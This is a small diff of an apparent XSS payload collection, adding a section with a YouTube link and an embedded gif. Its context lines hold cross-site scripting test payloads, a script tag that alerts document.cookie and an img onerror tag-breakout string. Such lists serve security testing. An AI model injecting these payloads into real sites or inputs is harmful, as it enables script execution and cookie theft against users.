@@ -121,6 +121,12 @@ nu11secur1ty<script>alert(document.cookie)</script>
 <img src="https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/nu11secur1ty/images/chalga-tochilka.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
 ```
 
+## chalg@4 0ut
+```js
+<a href="https://www.youtube.com/watch?v=yPuC4Cy2ZuI" target="_blank" rel="noopener nofollow ugc">
+<img src="https://i.makeagif.com/media/4-26-2015/6XX5F7.gif" style="border:1px solid black;max-width:100%;" alt="Photo of Byron Bay, one of Australia's best beaches!">
+```
+
 ## Error check
 ```
 </span><img src=1 onerror=alert(1) /><span>
